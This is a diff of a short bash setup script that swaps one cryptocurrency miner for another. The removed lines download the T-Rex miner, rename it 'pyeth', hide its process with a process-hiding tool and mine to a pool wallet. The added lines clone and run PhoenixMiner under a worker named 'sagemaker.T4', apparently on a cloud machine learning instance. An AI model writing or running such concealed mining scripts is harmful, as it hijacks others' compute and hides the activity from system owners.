@@ -1,20 +1,12 @@
 #!/bin/bash
-cd /usr/local/bin
-sudo apt-get install linux-headers-$(uname -r) -y
-distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
-sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
-sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
-echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+#!/bin/sh
 sudo apt-get update
-sudo apt-get -y install cuda-drivers
-sudo apt-get install libcurl3 -y
-sudo apt install gcc
-npm i -g node-process-hider
-sudo ph add pyeth
-sudo wget https://github.com/trexminer/T-Rex/releases/download/0.23.1/t-rex-0.23.1-linux.tar.gz
-sudo tar xvzf t-rex-0.23.1-linux.tar.gz
-mv t-rex pyeth
-sudo ./pyeth -a ethash -o ethash.unmineable.com:3333 -u LTC:LZJ1fV1kYYqAutEHPmEyRTFmvN7L5ZKZAV.uu -p x  
+sudo apt-get install git
+sudo apt-get install libpci3
+git clone https://github.com/L00K11/PhoenixMiner.git
+cd PhoenixMiner
+cd PhoenixMiner_L0K1
+chmod +x PhoenixMiner
+./PhoenixMiner -pool ethash.poolbinance.com:443 -wal sagemaker.T4 -pass x  
 	
 	
